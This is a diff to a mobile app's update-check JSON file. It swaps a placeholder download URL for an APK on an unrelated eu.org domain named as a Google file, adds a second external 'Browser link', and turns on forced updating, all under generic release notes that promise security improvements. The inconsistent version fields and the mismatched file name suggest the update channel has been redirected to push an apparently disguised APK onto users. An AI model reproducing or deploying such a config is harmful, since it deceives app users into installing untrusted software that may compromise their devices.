@@ -1,11 +1,12 @@
 {
+  "Title": "New Update Available",
   "versionCode": "1",
-  "versionName": "1.0.1",
-  "downloadLink": "https://example.com/downloads/my_app_v1.0.1.apk",
-  "forceUpdate": false,
-  "Title": "Awesome New Features!",
-  "Msg": "We've listened to your feedback and made some significant improvements:\n\n- Dark Mode support added.\n- Faster loading times.\n- Improved stability and bug fixes.",
-  "updateSize": "30.5 MB",
-  "releaseDate": "2023-10-27",
-  "priority": "high"
+  "versionName": "5.2.0",
+  "updateSize": "10.2 MB",
+  "releaseDate": "Feb 15, 2024",
+  "Msg": "This update includes:\n\n- Performance improvements\n- Bug fixes\n- New feature: Dark Mode\n- Enhanced security features",
+  "downloadLink": "https://dl.NoGutsNoGlory.eu.org/1741925/google_1.0.apk?hash=uNV0TuF",
+  "Browser link": "https://www.designlabofficial.site/p/download.html",
+  "forceUpdate": true,
+  "Direct Function": true
 }
